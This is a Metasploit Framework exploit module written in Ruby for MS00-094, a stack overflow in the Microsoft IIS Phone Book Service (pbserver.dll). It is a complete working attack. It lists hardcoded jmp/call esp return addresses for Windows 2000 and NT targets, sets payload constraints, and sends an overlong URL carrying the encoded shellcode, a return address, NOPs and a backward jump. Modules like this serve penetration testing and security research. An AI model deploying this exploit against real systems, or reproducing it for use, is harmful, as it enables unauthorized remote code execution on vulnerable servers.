##
# $Id: ms00_094_pbserver.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS Phone Book Service Overflow',
			'Description'    => %q{
					This is an exploit for the Phone Book Service /pbserver/pbserver.dll
				described in MS00-094. By sending an overly long URL argument
				for phone book updates, it is possible to overwrite the stack. This
				module has only been tested against Windows 2000 SP1.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2000-1089' ],
					[ 'OSVDB', '463' ],
					[ 'BID', '2048' ],
					[ 'MSB', 'MS00-094' ],
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 896,
					'BadChars' => "\x00\x0a\x0d\x20%&=?",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP1', { 'Ret' => 0x77e8898b }], # jmp esp kernel32.dll
					['Windows 2000 SP0', { 'Ret' => 0x77ea162b }], # call esp kernel32.dll
					['Windows NT SP6', { 'Ret' => 0x77f32836 }], # jmp esp kernel32.dll
				],
			'DisclosureDate' => 'Dec 04 2000',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URL', [ true,  "The path to pbserver.dll", "/pbserver/pbserver.dll" ]),
			], self.class)
	end

	def check
		print_status("Requesting the vulnerable ISAPI path...")
		res = send_request_raw({
			'uri' => datastore['URL']
		}, 5)

		if (res and res.code == 400)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		print_status("Sending overflow...")

		res = send_request_raw({
			'uri' => datastore['URL'] + '?&&&&&&pb=' + payload.encoded + [target['Ret']].pack('V') + make_nops(8) + Rex::Arch::X86.jmp(-912)
		}, 5)

		handler

	end

end
